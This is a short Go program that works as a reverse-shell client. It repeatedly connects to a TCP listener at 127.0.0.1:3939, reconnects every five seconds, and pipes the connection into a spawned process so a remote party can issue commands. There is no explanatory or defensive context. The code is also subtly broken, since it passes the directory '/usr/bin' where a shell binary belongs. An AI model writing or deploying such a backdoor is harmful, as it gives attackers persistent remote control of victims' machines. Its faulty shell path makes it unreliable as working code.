package main

import (
	"io"
	"net"
	"os/exec"
	"time"
)

func main() {
	serverAddr := "127.0.0.1:3939"

	for {
		conn, err := net.Dial("tcp", serverAddr)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}

		handleConnections(conn)
	}
}

func handleConnections(conn net.Conn) {
	defer conn.Close()

	cmd := exec.Command("/usr/bin")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	err := cmd.Run()
	if err != nil {
		io.WriteString(conn, "Shell exited.\n")
		time.Sleep(5 * time.Second)
	}
}
